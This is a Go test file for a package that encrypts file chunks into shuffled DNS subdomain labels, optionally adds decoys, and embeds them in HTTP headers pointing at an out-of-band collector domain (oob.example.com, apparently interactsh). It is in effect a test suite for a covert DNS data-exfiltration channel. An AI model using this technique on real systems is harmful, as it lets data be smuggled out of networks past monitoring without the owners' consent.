package wire

import (
	"bytes"
	"strings"
	"testing"

	dbcrypto "db26/internal/crypto"
)

func testKey() dbcrypto.SessionKey {
	return dbcrypto.DeriveKeyFromSalt("test-passphrase", make([]byte, 16))
}

func TestEncodeDecodeRoundTrip(t *testing.T) {
	sk := testKey()
	data := []byte("hello world test data!!")

	chunk := Chunk{FileID: 1, Seq: 0, Total: 5, Data: data}

	subdomain := EncodeChunkToSubdomain(chunk, sk, 0)
	labels := strings.Split(subdomain, ".")

	decoded, err := DecodeSubdomain(labels, sk)
	if err != nil {
		t.Fatal(err)
	}

	if decoded.FileID != chunk.FileID {
		t.Errorf("FileID = %d, want %d", decoded.FileID, chunk.FileID)
	}
	if decoded.Seq != chunk.Seq {
		t.Errorf("Seq = %d, want %d", decoded.Seq, chunk.Seq)
	}
	if decoded.Total != chunk.Total {
		t.Errorf("Total = %d, want %d", decoded.Total, chunk.Total)
	}
	if !bytes.Equal(decoded.Data, chunk.Data) {
		t.Error("data mismatch")
	}
}

func TestEncodeDecodeWithDecoys(t *testing.T) {
	sk := testKey()
	chunk := Chunk{FileID: 42, Seq: 7, Total: 100, Data: []byte("decoy test data here!")}

	for i := 0; i < 50; i++ {
		subdomain := EncodeChunkToSubdomain(chunk, sk, 1.0) // Always decoy
		labels := strings.Split(subdomain, ".")

		decoded, err := DecodeSubdomain(labels, sk)
		if err != nil {
			t.Fatalf("decode with decoys: %v (labels: %v)", err, labels)
		}
		if decoded.FileID != chunk.FileID || decoded.Seq != chunk.Seq {
			t.Error("field mismatch with decoys")
		}
		if !bytes.Equal(decoded.Data, chunk.Data) {
			t.Error("data mismatch with decoys")
		}
	}
}

func TestShuffleVaries(t *testing.T) {
	sk := testKey()
	chunk := Chunk{FileID: 1, Seq: 2, Total: 3, Data: []byte("shuffle test data!!")}

	orders := make(map[string]bool)
	for i := 0; i < 100; i++ {
		subdomain := EncodeChunkToSubdomain(chunk, sk, 0)
		orders[subdomain] = true
	}
	if len(orders) < 3 {
		t.Errorf("only %d unique orderings in 100 tries", len(orders))
	}
}

func TestBuildHeaderValue(t *testing.T) {
	sub := "abc.def.ghi.data1234"
	corrID := "corr123"
	oob := "oob.example.com"

	tests := []struct {
		prefix   string
		contains string
	}{
		{"host", "abc.def.ghi.data1234.corr123.oob.example.com"},
		{"xff", "abc.def.ghi.data1234.corr123.oob.example.com"},
		{"wafp", "http://abc.def.ghi.data1234.corr123.oob.example.com/wap.xml"},
		{"contact", "root@abc.def.ghi.data1234.corr123.oob.example.com"},
		{"from", "root@abc.def.ghi.data1234.corr123.oob.example.com"},
		{"ff", "for=abc.def.ghi.data1234.corr123.oob.example.com"},
		{"origin", "https://abc.def.ghi.data1234.corr123.oob.example.com"},
	}

	for _, tt := range tests {
		val := BuildHeaderValue(sub, corrID, oob, tt.prefix)
		if val != tt.contains {
			t.Errorf("BuildHeaderValue(%s) = %q, want %q", tt.prefix, val, tt.contains)
		}
	}
}

func TestHeaderNameFromPrefix(t *testing.T) {
	if HeaderNameFromPrefix("host") != "Host" {
		t.Error("host → Host")
	}
	if HeaderNameFromPrefix("xff") != "X-Forwarded-For" {
		t.Error("xff → X-Forwarded-For")
	}
	if HeaderNameFromPrefix("ref") != "Referer" {
		t.Error("ref → Referer")
	}
}

func TestChunkFile(t *testing.T) {
	data := make([]byte, 100)
	for i := range data {
		data[i] = byte(i)
	}

	chunks := ChunkFile(1, data)
	expected := (100 + MaxDataPerChunk - 1) / MaxDataPerChunk

	if len(chunks) != expected {
		t.Errorf("got %d chunks, want %d", len(chunks), expected)
	}

	var reassembled []byte
	for _, c := range chunks {
		reassembled = append(reassembled, c.Data...)
	}
	if !bytes.Equal(reassembled, data) {
		t.Error("reassembled data doesn't match")
	}
}

// TestFullPipeline simulates: encode → build header → extract from interactsh full-id → decode
func TestFullPipeline(t *testing.T) {
	sk := testKey()
	chunk := Chunk{FileID: 10, Seq: 3, Total: 20, Data: []byte("pipeline test data!!")}
	corrID := "abc123def456ghi789jkl012mno345pqr"
	oobDomain := "oob.example.com"

	// Sender: encode chunk → build header value
	subdomain := EncodeChunkToSubdomain(chunk, sk, 0)
	headerVal := BuildHeaderValue(subdomain, corrID, oobDomain, "host")

	// The target resolves this as a DNS query → interactsh captures full-id
	// full-id is everything BEFORE the oob domain: subdomain.corrID
	// (interactsh strips the oob domain suffix)
	fullID := subdomain + "." + corrID

	// Receiver: parse full-id → strip corrID → decode
	labels := strings.Split(strings.ToLower(fullID), ".")
	var dataLabels []string
	for _, l := range labels {
		if l != corrID {
			dataLabels = append(dataLabels, l)
		}
	}

	decoded, err := DecodeSubdomain(dataLabels, sk)
	if err != nil {
		t.Fatalf("decode from full-id: %v (headerVal=%s fullID=%s labels=%v)", err, headerVal, fullID, dataLabels)
	}

	if decoded.FileID != chunk.FileID || decoded.Seq != chunk.Seq || decoded.Total != chunk.Total {
		t.Errorf("field mismatch: got %+v want fileID=%d seq=%d total=%d", decoded, chunk.FileID, chunk.Seq, chunk.Total)
	}
	if !bytes.Equal(decoded.Data, chunk.Data) {
		t.Error("data mismatch in full pipeline")
	}
}
